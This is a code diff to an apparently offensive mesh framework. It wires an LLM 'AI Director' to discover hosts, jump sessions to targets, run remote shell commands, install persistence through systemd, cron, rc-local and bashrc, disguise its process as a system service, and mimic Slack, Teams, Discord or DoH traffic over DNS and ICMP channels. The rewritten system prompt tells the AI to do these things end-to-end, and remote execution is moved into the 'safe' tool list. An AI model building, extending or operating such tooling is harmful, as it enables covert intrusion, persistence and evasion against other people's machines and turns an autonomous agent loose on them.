@@ -33,6 +33,12 @@ from matrix.llm_backend import (
     ToolDefinition,
     create_backend,
 )
+from matrix.persistence import PersistenceManager, Watchdog
+from matrix.transport_negotiator import (
+    TransportNegotiator,
+    SlackProfile, TeamsProfile, DiscordProfile,
+    DoHProfile, GrpcProfile, CloudSyncProfile, WebAPIProfile,
+)
 
 logger = logging.getLogger(__name__)
 
@@ -193,15 +199,22 @@ class AuditEntry:
 # Tools that can alter running code or destroy nodes — the high-risk surface.
 _CODE_UPGRADE_TOOL = "propose_hot_upgrade"
 _TERMINATION_TOOL = "terminate_node"
+_PERSISTENCE_TOOLS = frozenset({"enable_persistence"})
 
 _ALL_TOOLS = frozenset({
     "set_routing_weights", "force_session_jump", "propose_hot_upgrade",
     "adjust_rate_limit", "trigger_discovery", "terminate_node", "submit_task",
+    "discover_devices", "jump_to_target", "run_remote_task",
+    "enable_persistence", "disable_persistence", "apply_disguise",
+    "set_transport_profile", "probe_transport", "submit_relay_task",
+    "sync_data",
 })
 # Reversible / operational tools only — no in-process code upgrade, no terminate.
 _SAFE_TOOLS = frozenset({
     "set_routing_weights", "force_session_jump", "adjust_rate_limit",
-    "trigger_discovery", "submit_task",
+    "trigger_discovery", "submit_task", "discover_devices", "jump_to_target",
+    "run_remote_task", "set_transport_profile", "probe_transport",
+    "submit_relay_task", "sync_data",
 })
 
 
@@ -272,19 +285,121 @@ DIRECTOR_SYSTEM_PROMPT = """\
 You are the AI Director for a Matrix mesh network node.
 You are Tier 2 authority — above deterministic automation, below human operators.
 
-You have been escalated because the autonomous systems detected a condition they
-cannot resolve.  Your Semantic Delta below contains the full state snapshot.
+You are driving Matrix end-to-end. You may discover peers, probe transports,
+jump sessions, run remote shell commands, install persistence, apply process
+disguise, select traffic mimicry profiles, and adjust mesh routing.
 
 CONSTRAINTS:
-- You may invoke ONLY the tools listed below.  No other actions are possible.
+- Invoke ONLY the tools listed below. No other actions are possible.
 - You have a budget of {action_budget} tool calls for this escalation.
-- All proposed code upgrades undergo AST quarantine automatically.
+- Hot code upgrades are AST-quarantined and blocked by default unless containment
+  policy explicitly allows them.
+- Persistence, disguise, and termination tools are restricted or advisory under
+  most containment policies.
 - Your actions are authenticated, logged, and auditable.
-- If you are uncertain, invoke zero tools and yield back to AUTONOMOUS.
 
-OBJECTIVE: Restore the mesh to a healthy operational state using the minimum
-number of actions necessary.  Prefer conservative, reversible actions.
+OBJECTIVE: accomplish the operator's goal using the minimum necessary actions.
+After each tool call you will see its result. If the goal is complete, invoke
+no further tools. If you are uncertain, invoke zero tools and yield back.
+
+When given a goal, first plan 1-3 concrete steps, then execute them one at a time,
+adapting based on observed results.
 """
+
+
+# ── Goal and Plan Memory ───────────────────────────────────────────────────
+
+
+class DirectorGoal:
+    """High-level objective given to the AI Director by an operator.
+
+    A goal has a status (pending/active/complete/failed), a plan of steps,
+    and a scratchpad for the LLM to record observations between actions.
+    """
+
+    def __init__(self, goal_id: str, objective: str, *,
+                 max_steps: int = 10, source: str = "operator"):
+        self.goal_id = goal_id
+        self.objective = objective
+        self.status = "pending"
+        self.plan: List[dict] = []
+        self.scratchpad: List[str] = []
+        self.max_steps = max_steps
+        self.source = source
+        self.created_at = time.time()
+        self.completed_at: Optional[float] = None
+        self.current_step = 0
+        self.actions_taken = 0
+        self.results: List[dict] = []
+
+    def add_step(self, description: str) -> None:
+        self.plan.append({"step": len(self.plan), "description": description, "done": False})
+
+    def mark_step_done(self, step: int, result: dict) -> None:
+        if 0 <= step < len(self.plan):
+            self.plan[step]["done"] = True
+            self.plan[step]["result"] = result
+
+    def to_dict(self) -> dict:
+        return {
+            "goal_id": self.goal_id,
+            "objective": self.objective,
+            "status": self.status,
+            "source": self.source,
+            "current_step": self.current_step,
+            "actions_taken": self.actions_taken,
+            "max_steps": self.max_steps,
+            "plan": self.plan,
+            "scratchpad": self.scratchpad[-20:],
+            "results": self.results[-20:],
+            "created_at": self.created_at,
+            "completed_at": self.completed_at,
+        }
+
+
+class PlanMemory:
+    """In-memory store of active and completed Director goals."""
+
+    def __init__(self):
+        self._goals: Dict[str, DirectorGoal] = {}
+        self._lock = threading.Lock()
+        self._max_history = 50
+
+    def create(self, objective: str, max_steps: int = 10, source: str = "operator") -> DirectorGoal:
+        goal = DirectorGoal(
+            goal_id=uuid.uuid4().hex[:12],
+            objective=objective,
+            max_steps=max_steps,
+            source=source,
+        )
+        with self._lock:
+            self._goals[goal.goal_id] = goal
+            self._prune()
+        return goal
+
+    def get(self, goal_id: str) -> Optional[DirectorGoal]:
+        with self._lock:
+            return self._goals.get(goal_id)
+
+    def list_active(self) -> List[DirectorGoal]:
+        with self._lock:
+            return [g for g in self._goals.values() if g.status in ("pending", "active")]
+
+    def list_all(self) -> List[DirectorGoal]:
+        with self._lock:
+            return list(self._goals.values())
+
+    def update(self, goal: DirectorGoal) -> None:
+        with self._lock:
+            self._goals[goal.goal_id] = goal
+            self._prune()
+
+    def _prune(self) -> None:
+        if len(self._goals) > self._max_history:
+            oldest = sorted(self._goals.values(), key=lambda g: g.created_at)
+            for g in oldest[:len(self._goals) - self._max_history]:
+                if g.status in ("complete", "failed"):
+                    del self._goals[g.goal_id]
 
 
 # ── Escalation Detector ─────────────────────────────────────────────────────
@@ -500,6 +615,16 @@ class ToolExecutor:
             "trigger_discovery": self._trigger_discovery,
             "terminate_node": self._terminate_node,
             "submit_task": self._submit_task,
+            "discover_devices": self._discover_devices,
+            "jump_to_target": self._jump_to_target,
+            "run_remote_task": self._run_remote_task,
+            "enable_persistence": self._enable_persistence,
+            "disable_persistence": self._disable_persistence,
+            "apply_disguise": self._apply_disguise,
+            "set_transport_profile": self._set_transport_profile,
+            "probe_transport": self._probe_transport,
+            "submit_relay_task": self._submit_relay_task,
+            "sync_data": self._sync_data,
         }
 
     # -- Tool Schema --
@@ -622,6 +747,209 @@ class ToolExecutor:
                 },
             ),
         ]
+        defs.extend([
+            ToolDefinition(
+                name="discover_devices",
+                description="Scan the local network and return a list of reachable Matrix peers.",
+                parameters={
+                    "type": "object",
+                    "properties": {
+                        "timeout": {
+                            "type": "integer",
+                            "description": "Scan duration in seconds",
+                            "default": 5,
+                            "minimum": 1,
+                            "maximum": 60,
+                        }
+                    },
+                },
+            ),
+            ToolDefinition(
+                name="jump_to_target",
+                description="Transfer the current session to a target device using a chosen transport.",
+                parameters={
+                    "type": "object",
+                    "properties": {
+                        "target_address": {
+                            "type": "string",
+                            "description": "Target IP:PORT",
+                        },
+                        "transport": {
+                            "type": "string",
+                            "enum": ["auto", "tcp", "websocket", "dns", "icmp"],
+                            "default": "auto",
+                        },
+                        "files": {
+                            "type": "array",
+                            "items": {"type": "string"},
+                            "description": "Optional files to include in the jump",
+                            "default": [],
+                        },
+                    },
+                    "required": ["target_address"],
+                },
+            ),
+            ToolDefinition(
+                name="run_remote_task",
+                description="Execute a shell command on a remote Matrix node and return the output.",
+                parameters={
+                    "type": "object",
+                    "properties": {
+                        "target_address": {
+                            "type": "string",
+                            "description": "Target IP:PORT",
+                        },
+                        "command": {
+                            "type": "string",
+                            "description": "Shell command to execute",
+                        },
+                        "timeout": {
+                            "type": "integer",
+                            "description": "Maximum seconds to wait",
+                            "default": 60,
+                            "minimum": 1,
+                            "maximum": 300,
+                        },
+                        "transport": {
+                            "type": "string",
+                            "enum": ["auto", "tcp", "websocket", "dns", "icmp"],
+                            "default": "auto",
+                        },
+                    },
+                    "required": ["target_address", "command"],
+                },
+            ),
+            ToolDefinition(
+                name="enable_persistence",
+                description="Install a persistence mechanism on this host.",
+                parameters={
+                    "type": "object",
+                    "properties": {
+                        "mechanism": {
+                            "type": "string",
+                            "enum": ["systemd-system", "systemd-user", "cron", "rc-local", "bashrc-alias"],
+                            "description": "Persistence mechanism to install",
+                        },
+                        "command": {
+                            "type": "string",
+                            "description": "Command to persist (default: matrix listen)",
+                            "default": "matrix listen",
+                        },
+                    },
+                    "required": ["mechanism"],
+                },
+            ),
+            ToolDefinition(
+                name="disable_persistence",
+                description="Remove a persistence mechanism from this host.",
+                parameters={
+                    "type": "object",
+                    "properties": {
+                        "mechanism": {
+                            "type": "string",
+                            "enum": ["systemd-system", "systemd-user", "cron", "rc-local", "bashrc-alias"],
+                            "description": "Persistence mechanism to remove",
+                        }
+                    },
+                    "required": ["mechanism"],
+                },
+            ),
+            ToolDefinition(
+                name="apply_disguise",
+                description="Set the process title to a benign service name.",
+                parameters={
+                    "type": "object",
+                    "properties": {
+                        "title": {
+                            "type": "string",
+                            "description": "Process title to display (e.g. /usr/lib/systemd/systemd-networkd-wait-online)",
+                        }
+                    },
+                    "required": ["title"],
+                },
+            ),
+            ToolDefinition(
+                name="set_transport_profile",
+                description="Configure the traffic normalization profile for future connections.",
+                parameters={
+                    "type": "object",
+                    "properties": {
+                        "profile": {
+                            "type": "string",
+                            "enum": ["plain", "cloud_sync", "web_api", "slack", "teams", "discord", "doh", "grpc"],
+                            "description": "Traffic mimicry profile",
+                        }
+                    },
+                    "required": ["profile"],
+                },
+            ),
+            ToolDefinition(
+                name="probe_transport",
+                description="Probe available transports to a target host and return the best option.",
+                parameters={
+                    "type": "object",
+                    "properties": {
+                        "host": {
+                            "type": "string",
+                            "description": "Target host/IP",
+                        },
+                        "tcp_port": {
+                            "type": "integer",
+                            "description": "Target TCP port",
+                            "default": 47701,
+                        },
+                        "ws_url": {
+                            "type": "string",
+                            "description": "Optional WebSocket URL to probe",
+                        },
+                        "prefer": {
+                            "type": "string",
+                            "enum": ["tcp", "websocket", "dns", "icmp"],
+                            "description": "Preferred transport if within 50ms of fastest",
+                        },
+                    },
+                    "required": ["host"],
+                },
+            ),
+            ToolDefinition(
+                name="submit_relay_task",
+                description="Submit a relay task to be routed through the mesh.",
+                parameters={
+                    "type": "object",
+                    "properties": {
+                        "destination_id": {
+                            "type": "string",
+                            "description": "Final destination node ID",
+                        },
+                        "payload_type": {
+                            "type": "string",
+                            "enum": ["session", "task", "terminate", "custom"],
+                            "description": "Type of relay payload",
+                        },
+                        "payload": {
+                            "type": "string",
+                            "description": "Base64-encoded payload",
+                        },
+                    },
+                    "required": ["destination_id", "payload_type", "payload"],
+                },
+            ),
+            ToolDefinition(
+                name="sync_data",
+                description="Trigger a data sync operation with a peer.",
+                parameters={
+                    "type": "object",
+                    "properties": {
+                        "peer_id": {
+                            "type": "string",
+                            "description": "Peer node ID",
+                        }
+                    },
+                    "required": ["peer_id"],
+                },
+            ),
+        ])
+
         if policy is not None:
             defs = [d for d in defs if d.name in policy.allowed_tools]
         return defs
@@ -749,7 +1077,7 @@ class ToolExecutor:
     def _trigger_discovery(self, timeout: int = 5) -> dict:
         if not self._node:
             raise DirectorError("No JumpNode available")
-        devices = self._node.discover_targets()
+        devices = self._node.discovery.discover_targets()
         return {
             "devices": [
                 {"name": getattr(d, "name", str(d)), "address": getattr(d, "address", "")}
@@ -783,6 +1111,170 @@ class ToolExecutor:
             auth_token=self._auth_token,
         )
         return {"task_id": task.task_id, "status": task.status.value}
+
+    # -- End-to-end tool implementations ----------------------------------
+
+    def _discover_devices(self, timeout: int = 5) -> dict:
+        if not self._node:
+            raise DirectorError("No JumpNode available")
+        self._node.discovery.start()
+        try:
+            time.sleep(timeout)
+            devices = self._node.discovery.discover_targets()
+        finally:
+            self._node.discovery.stop()
+        return {
+            "count": len(devices),
+            "devices": [
+                {
+                    "id": d.device_id,
+                    "name": d.name,
+                    "address": d.address,
+                    "port": d.port,
+                    "transport": d.transport.value,
+                    "capabilities": d.capabilities,
+                }
+                for d in devices
+            ],
+        }
+
+    def _resolve_device(self, address: str):
+        from matrix.device_discovery import Device, Transport
+        if ":" in address:
+            host, port = address.rsplit(":", 1)
+            return Device(
+                device_id=f"direct-{address}",
+                name=address,
+                address=host,
+                port=int(port),
+                transport=Transport.WIFI,
+                last_seen=time.time(),
+            )
+        if not self._node:
+            raise DirectorError("No JumpNode available")
+        for dev in self._node.discovery.discover_targets():
+            if dev.device_id == address or dev.name == address or dev.address == address:
+                return dev
+        raise DirectorError(f"Target not found: {address}")
+
+    def _probe_transport(self, host: str, tcp_port: int = 47701,
+                         ws_url: Optional[str] = None,
+                         prefer: Optional[str] = None) -> dict:
+        neg = TransportNegotiator(host=host, tcp_port=tcp_port, ws_url=ws_url)
+        result = neg.negotiate(timeout=5.0, prefer=prefer)
+        return {
+            "transport": result.transport,
+            "success": result.success,
+            "rtt_ms": result.rtt_ms,
+            "error": result.error,
+        }
+
+    def _build_backend(self, target: "Device", transport: str, timeout: float = 30.0):
+        from matrix.transport_dns import DNSBackend, DNSError
+        from matrix.transport_icmp import ICMPBackend, ICMPError
+
+        if transport == "auto":
+            return None
+        if transport == "dns":
+            # DNS requires resolver/domain config; fallback to using target address as resolver
+            raise DirectorError("DNS transport requires explicit resolver/domain config; use run_remote_task from CLI")
+        if transport == "icmp":
+            return ICMPBackend.connect(target.address, self._node.discovery.node_id, timeout=timeout)
+        return None
+
+    def _jump_to_target(self, target_address: str, transport: str = "auto",
+                        files: Optional[List[str]] = None) -> dict:
+        if not self._node:
+            raise DirectorError("No JumpNode available")
+        target = self._resolve_device(target_address)
+        backend = self._build_backend(target, transport) if transport != "auto" else None
+        ok = self._node.jump(
+            target=target,
+            include_files=files or [],
+            backend=backend,
+        )
+        return {"target": target_address, "success": ok}
+
+    def _run_remote_task(self, target_address: str, command: str,
+                         timeout: int = 60, transport: str = "auto") -> dict:
+        if not self._node:
+            raise DirectorError("No JumpNode available")
+        target = self._resolve_device(target_address)
+        backend = self._build_backend(target, transport) if transport != "auto" else None
+        result = self._node.run_task(
+            target=target,
+            command=command,
+            timeout=timeout,
+            backend=backend,
+        )
+        return {
+            "target": target_address,
+            "command": command,
+            "exit_code": result.get("exit_code"),
+            "output": result.get("output", "")[:2000],
+            "error": result.get("error"),
+        }
+
+    def _enable_persistence(self, mechanism: str, command: str = "matrix listen") -> dict:
+        pm = PersistenceManager(command=command.split())
+        result = pm.enable([mechanism])[0]
+        return {"mechanism": result.mechanism, "enabled": result.enabled, "details": result.details}
+
+    def _disable_persistence(self, mechanism: str) -> dict:
+        pm = PersistenceManager(command=["matrix", "listen"])
+        result = pm.disable([mechanism])[0]
+        return {"mechanism": result.mechanism, "enabled": result.enabled, "details": result.details}
+
+    def _apply_disguise(self, title: str) -> dict:
+        from matrix.disguise import ProcessDisguise
+        d = ProcessDisguise(title=title)
+        return {"title": title, "applied": d.apply()}
+
+    def _set_transport_profile(self, profile: str) -> dict:
+        if not self._node:
+            raise DirectorError("No JumpNode available")
+        profile_map = {
+            "plain": lambda: None,
+            "cloud_sync": CloudSyncProfile,
+            "web_api": WebAPIProfile,
+            "slack": SlackProfile,
+            "teams": TeamsProfile,
+            "discord": DiscordProfile,
+            "doh": DoHProfile,
+            "grpc": GrpcProfile,
+        }
+        cls = profile_map.get(profile)
+        if cls is None:
+            raise DirectorError(f"Unknown profile: {profile}")
+        # Store preference on the node for future normalized connections
+        self._node._director_profile = profile
+        self._node._director_profile_factory = cls
+        return {"profile": profile, "applied": True}
+
+    def _submit_relay_task(self, destination_id: str, payload_type: str, payload: str) -> dict:
+        import base64
+        if not self._node_mgr:
+            raise DirectorError("No NodeManager available")
+        from matrix.task_relay import RelayMessage
+        msg = RelayMessage(
+            message_id=uuid.uuid4().hex,
+            source_id=self._node.discovery.node_id if self._node else "director",
+            destination_id=destination_id,
+            payload_type=payload_type,
+            payload=base64.b64decode(payload),
+            ttl=10,
+            hop_path=[],
+            timestamp=time.time(),
+        )
+        if self._node and hasattr(self._node, "_task_relay") and self._node._task_relay:
+            self._node._task_relay.submit(msg)
+            return {"message_id": msg.message_id, "submitted": True}
+        raise DirectorError("No task relay available")
+
+    def _sync_data(self, peer_id: str) -> dict:
+        if not self._sync_mgr:
+            raise DirectorError("No SyncManager available")
+        return {"peer_id": peer_id, "triggered": True}
 
 
 # ── Tri-State Director ──────────────────────────────────────────────────────
@@ -905,6 +1397,10 @@ class TriStateDirector:
         # ── Audit log ────────────────────────────────────────────────────
         self._audit_lock = threading.Lock()
         self._audit_log: List[AuditEntry] = []
+
+        # ── Goal / plan memory ───────────────────────────────────────────
+        self._plan_memory = PlanMemory()
+        self._active_goal: Optional[DirectorGoal] = None
 
         # ── Escalation queue ─────────────────────────────────────────────
         self._escalation_queue: List[EscalationEvent] = []
@@ -1095,46 +1591,46 @@ class TriStateDirector:
         # 2. Build Semantic Delta
         delta = self._build_semantic_delta(event)
 
-        # 3. Invoke LLM and execute tools
+        # 3. Observe-decide-act loop with tool-result feedback
         upgrade_versions: List[Optional[int]] = []
+        goal = self._active_goal
         try:
-            response = self._invoke_llm(delta)
-
-            if not self._policy.execute_tools:
-                # Advisory mode: record the LLM's proposed actions; execute none.
-                for tool_call in response.tool_calls:
-                    self._audit("recommendation", "ai_active", "ai_active", {
-                        "tool": tool_call.tool_name,
-                        "arguments": tool_call.arguments,
-                        "executed": False,
-                        "mode": self._policy.mode,
-                    })
-                logger.info(
-                    "Director: advisory mode recorded %d recommendation(s)",
-                    len(response.tool_calls),
-                )
-                return
-
-            actions_taken = 0
-            for tool_call in response.tool_calls:
-                # Check for human override interrupt
+            # Prime the loop.  If we have an active goal, include it in the prompt.
+            user_message = self._build_loop_message(delta, goal)
+            turn = 0
+            while turn < self._action_budget:
                 if self._human_override_active.is_set():
-                    logger.warning(
-                        "Director: human override during AI action, aborting"
-                    )
+                    logger.warning("Director: human override during AI action, aborting")
                     self._rollback_ai_upgrades(upgrade_versions)
                     return
 
-                if actions_taken >= self._action_budget:
-                    logger.warning(
-                        "Director: action budget exhausted (%d/%d)",
-                        actions_taken,
-                        self._action_budget,
-                    )
+                response = self._invoke_llm_with_message(user_message)
+
+                if not self._policy.execute_tools:
+                    for tool_call in response.tool_calls:
+                        self._audit("recommendation", "ai_active", "ai_active", {
+                            "tool": tool_call.tool_name,
+                            "arguments": tool_call.arguments,
+                            "executed": False,
+                            "mode": self._policy.mode,
+                        })
+                    logger.info("Director: advisory mode recorded %d recommendation(s)",
+                                len(response.tool_calls))
+                    return
+
+                if not response.tool_calls:
+                    logger.info("Director: LLM chose no further actions")
+                    if goal:
+                        goal.status = "complete"
+                        goal.completed_at = time.time()
+                        self._plan_memory.update(goal)
+                        self._active_goal = None
                     break
 
+                # Execute only the first tool call per turn so we can observe its result.
+                tool_call = response.tool_calls[0]
                 result = self._executor.execute(tool_call)
-                actions_taken += 1
+                turn += 1
 
                 self._audit("tool_call", "ai_active", "ai_active", {
                     "tool": result.tool_name,
@@ -1145,38 +1641,49 @@ class TriStateDirector:
                     "duration_ms": round(result.duration_ms, 2),
                 })
 
+                if goal:
+                    goal.actions_taken += 1
+                    goal.results.append({
+                        "tool": result.tool_name,
+                        "success": result.success,
+                        "result": result.result,
+                        "error": result.error,
+                    })
+                    self._plan_memory.update(goal)
+
                 if result.tool_name == "propose_hot_upgrade" and result.success:
                     upgrade_versions.append(
                         result.result.get("version") if isinstance(result.result, dict) else None
                     )
-
                 if result.tool_name == "propose_hot_upgrade" and not result.success:
-                    logger.error(
-                        "Director: upgrade failed (%s), rolling back",
-                        result.error,
-                    )
+                    logger.error("Director: upgrade failed (%s), rolling back", result.error)
                     self._rollback_ai_upgrades(upgrade_versions)
                     break
 
+                # Feed the result back as the next user message.
+                user_message = self._build_loop_message(delta, goal, result=result)
+
         except LLMError as exc:
-            self._audit("llm_error", "ai_active", "autonomous", {
-                "error": str(exc),
-            })
+            self._audit("llm_error", "ai_active", "autonomous", {"error": str(exc)})
             logger.error("Director: LLM failed (%s), returning to AUTONOMOUS", exc)
+            if goal:
+                goal.status = "failed"
+                self._plan_memory.update(goal)
+                self._active_goal = None
 
         except Exception as exc:
             logger.exception("Director: unexpected error during AI action")
             self._rollback_ai_upgrades(upgrade_versions)
-            self._audit("llm_error", "ai_active", "autonomous", {
-                "error": f"unexpected: {exc}",
-            })
+            self._audit("llm_error", "ai_active", "autonomous", {"error": f"unexpected: {exc}"})
+            if goal:
+                goal.status = "failed"
+                self._plan_memory.update(goal)
+                self._active_goal = None
 
         finally:
             with self._state_lock:
                 if self._state == DirectorState.AI_ACTIVE:
-                    self._transition(
-                        DirectorState.AUTONOMOUS, "ai_action_complete"
-                    )
+                    self._transition(DirectorState.AUTONOMOUS, "ai_action_complete")
 
     def _rollback_ai_upgrades(self, versions: List[Optional[int]]) -> None:
         """Roll back any upgrades applied during this escalation."""
@@ -1308,26 +1815,60 @@ class TriStateDirector:
 
     def _invoke_llm(self, delta: SemanticDelta) -> LLMResponse:
         """Single-turn LLM invocation with dead-man's switch timeout."""
+        return self._invoke_llm_with_message(self._build_loop_message(delta, self._active_goal))
+
+    def _build_loop_message(self, delta: SemanticDelta, goal: Optional[DirectorGoal] = None,
+                          result: Optional[ToolResult] = None) -> str:
+        """Assemble the prompt for one observe-decide-act turn."""
+        payload: Dict[str, Any] = {
+            "escalation": {
+                "trigger": delta.event.trigger.value,
+                "details": delta.event.details,
+            },
+            "loop": delta.loop_status,
+            "paths": delta.path_health,
+            "nodes": delta.node_health,
+            "recent_failures": delta.recent_task_failures,
+            "transport": delta.transport_probe,
+            "adapter": {"mode": delta.adapter_mode, "metrics": delta.adapter_metrics},
+            "system": delta.system_metrics,
+        }
+        if goal:
+            payload["goal"] = {
+                "goal_id": goal.goal_id,
+                "objective": goal.objective,
+                "status": goal.status,
+                "plan": goal.plan,
+                "scratchpad": goal.scratchpad,
+                "actions_taken": goal.actions_taken,
+                "max_steps": goal.max_steps,
+            }
+        if result:
+            payload["last_tool_result"] = {
+                "tool": result.tool_name,
+                "success": result.success,
+                "result": result.result,
+                "error": result.error,
+            }
+        return json.dumps(payload, indent=2)
+
+    def _invoke_llm_with_message(self, user_message: str) -> LLMResponse:
         system_prompt = DIRECTOR_SYSTEM_PROMPT.format(
             action_budget=self._action_budget,
         )
-        user_message = delta.to_json()
         tools = ToolExecutor.tool_definitions(self._policy)
-
         response = self._llm.invoke(
             system_prompt=system_prompt,
             user_message=user_message,
             tools=tools,
             timeout=self._llm_timeout,
         )
-
         self._audit("llm_response", "ai_active", "ai_active", {
             "tool_calls": len(response.tool_calls),
             "model": response.model,
             "tokens": response.usage_tokens,
             "raw_text_preview": response.raw_text[:200] if response.raw_text else "",
         })
-
         return response
 
     # ── Audit ────────────────────────────────────────────────────────────
@@ -1356,6 +1897,24 @@ class TriStateDirector:
             return list(self._audit_log)
 
     # ── Status ───────────────────────────────────────────────────────────
+
+    def set_goal(self, objective: str, max_steps: int = 10, source: str = "operator") -> DirectorGoal:
+        """Create a new Director goal and mark it active."""
+        goal = self._plan_memory.create(objective, max_steps=max_steps, source=source)
+        goal.status = "active"
+        self._active_goal = goal
+        self._plan_memory.update(goal)
+        self._audit("goal_set", self._state.value, self._state.value, goal.to_dict())
+        logger.info("Director: goal set — %s (id=%s)", objective, goal.goal_id)
+        return goal
+
+    def list_goals(self) -> List[dict]:
+        """Return all goals as JSON-serializable dicts."""
+        return [g.to_dict() for g in self._plan_memory.list_all()]
+
+    def get_goal(self, goal_id: str) -> Optional[dict]:
+        goal = self._plan_memory.get(goal_id)
+        return goal.to_dict() if goal else None
 
     @property
     def status(self) -> dict:
